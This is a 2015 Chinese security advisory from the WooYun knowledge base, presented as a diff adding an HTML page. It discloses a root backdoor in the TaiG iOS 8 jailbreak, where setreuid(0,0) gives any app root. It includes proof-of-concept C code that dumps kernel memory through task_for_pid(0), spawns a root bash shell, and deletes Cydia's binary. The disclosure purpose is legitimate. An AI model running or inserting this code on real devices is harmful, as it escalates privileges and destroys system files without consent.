@@ -1,0 +1,87 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">太极越狱重大安全后门</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2015/07/01 19:05" ui-time="" datetime="2015/07/01 19:05" class="published ng-binding ng-isolate-scope">2015/07/01 19:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>太极越狱iOS8.1.3-8.4含有重大安全后门，越狱后导致任意APP可以提权到Root，从而影响用户数据的安全。举例来说获取Root权限后可以完全控制系统文件，甚至进一步安装木马等严重威胁用户安全的恶意软件。</p><h1>0x01 细节</h1><hr><p>具体分析结果显示太极越狱修改了<code>setreuid</code>这个关键系统API，导致任意APP都可以直接调用<code>setreuid(0,0)</code>获得Root执行权限，从而可以修改任意系统文件、也可以<code>task_for_pid</code>打开系统内核句柄从而完全控制系统底层。例如通过写入系统目录<code>“/Library/LaunchDaemons”</code>可以注册系统服务，从而植入木马、病毒、盗号工具威胁用户隐私数据和密码。</p><p>漏洞重现演示如下图：</p><p><img alt="enter image description here" img-src="b8c5efe580e621eb964c8fd4915cb630665e06d4.jpg"></p><p>示例一：通过<code>test_taig_backdoor1</code>程序读取内核内存</p><p><img alt="enter image description here" img-src="512b5c7dbc52f86b96d5d1b27f16151ee2458f87.jpg"></p><p>示例二：通过<code>test_taig_backdoor2</code>获得root权限shell</p><p><code>test_taig_backdoor</code>读取任意内核poc代码：</p><pre><code>#!c
+#include &lt;Foundation/Foundation.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;spawn.h&gt;
+#include &lt;mach/mach.h&gt;
+
+void dump_kernel_memory(vm_address_t addr)
+{
+    kern_return_t kret;
+    mach_port_t proc_task = 0;
+    vm_size_t ret_size = 0;
+    vm_size_t i;
+    char buffer[128] = {0};
+    int ret;
+
+    ret = task_for_pid(mach_task_self(), 0, &amp;proc_task);
+    if (ret != 0)
+    {
+        NSLog(@"[err] get tfp0 fail: %d", ret);
+        return;
+    }
+
+    NSLog(@"task for pid 0 = %u", proc_task);
+
+        kret = vm_read_overwrite(proc_task,
+                                addr,
+                                sizeof(buffer),
+                                  (vm_address_t)buffer,
+                                   &amp;ret_size);
+
+    char *info = malloc(4096);
+    info[0] = '\0';
+
+    for (i = 0; i &lt; ret_size; i++)
+    {
+        if (i % 16 == 0) sprintf(info + strlen(info), "\n%p: ", (void *)(addr + i));
+        sprintf(info + strlen(info), "0x%02x ", *(uint8_t*)(buffer + i));
+    }
+    NSLog(@"%s", info);
+
+    free(info);
+}
+
+int main (int argc, const char * argv[])
+{
+    if (argc != 2)
+    {
+        NSLog(@"%s [kernel_address]", argv[0]);
+        return 0;
+    }
+
+    NSLog(@"current uid=%d euid=%d", getuid(), geteuid());
+
+    /*
+    * taig backdoor test
+    */
+
+    setreuid(0,0);
+
+    NSLog(@"now uid=%d euid=%d", getuid(), geteuid());
+
+    vm_address_t addr = strtoul(argv[1], NULL, 16);
+    dump_kernel_memory(addr);
+
+    return 0;
+}
+</code></pre><p>test&#95;taig&#95;backdoor2提权poc代码：</p><pre><code>#!c
+void get_root_shell
+{
+    setreuid(0,0);
+    system("/bin/bash -i");
+}
+</code></pre><p>在APP中添加下面的代码进行删除文件测试（谨慎执行）：</p><pre><code>#!c
+void testBackdoor()
+{
+NSLog(@"当前运行进程 uid=%d euid=%d", getuid(), geteuid());
+setreuid(0,0);
+NSLog(@"后门提权后，当前运行进程 uid=%d euid=%d", getuid(), geteuid());
+
+NSLog(@"删除任意文件演示（该测试会导致Cydia无法运行，请谨慎执行）");
+unlink("/Applications/Cydia.app/MobileCydia");
+}
+</code></pre><p>太极越狱iOS8.0-8.1.1未能找到机器进行测试，可能也有此重大后门。</p><h1>0x02 总结</h1><hr><p>越狱软件中藏有安全后门并非没有先例。早在针对iOS 7的完美越狱工具evasi0n7中，越狱开发者evad3rs就修改了第0号系统调用，导致任意app可以轻易获得内核代码执行的能力。这一做法也引起越狱大神winocm的强烈不满(<a href="http://winocm.moe/projects/research/2014/01/11/evading-ios-security/">http://winocm.moe/projects/research/2014/01/11/evading-ios-security/</a>)。早在2014年Winocm在博文中就已经质疑太极是否在利用这个后门。</p><p>太极越狱与evad3rs的“绯闻”一直没有间断。据福布斯报道（<a href="http://www.forbes.com/sites/thomasbrewster/2015/06/26/china-iphone-jailbreak-industry/">http://www.forbes.com/sites/thomasbrewster/2015/06/26/china-iphone-jailbreak-industry/</a>）（<a href="http://mobile.163.com/15/0630/10/ATBNV93H0011671M.html">http://mobile.163.com/15/0630/10/ATBNV93H0011671M.html</a>）, 太极曾支付evad3rs高达一百万美金用于越狱合作开发，该合作的产物就是evasi0n7强制安装“太极助手”的闹剧。至于太极越狱的安全后门是“惯犯”还是“初犯”的谜底恐怕就无法揭开了。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/news/1011" rel="bookmark" id="re1">回顾历史上那些因为一行代码出现问题的bug</a></li><li><a href="http://drops.wooyun.org/tips/5535" rel="bookmark" id="re2">wargame narnia writeup</a></li><li><a href="http://drops.wooyun.org/papers/13433" rel="bookmark" id="re3">CVE-2016-0799简单分析</a></li><li><a href="http://drops.wooyun.org/tips/9300" rel="bookmark" id="re4">安卓动态调试七种武器之离别钩 – Hooking（上）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-07-06 23:26:45</span></div><p></p><p>感觉下面的回复好多都是水军啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ano_Tom</span> <span class="reply-time">2015-07-01 21:36:09</span></div><p></p><p>怎么隐隐约约感觉来了一堆水军。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dangge</span> <span class="reply-time">2015-07-01 21:25:28</span></div><p></p><p>贵圈真乱。</p><p></p></div></div></div></div></div></main>
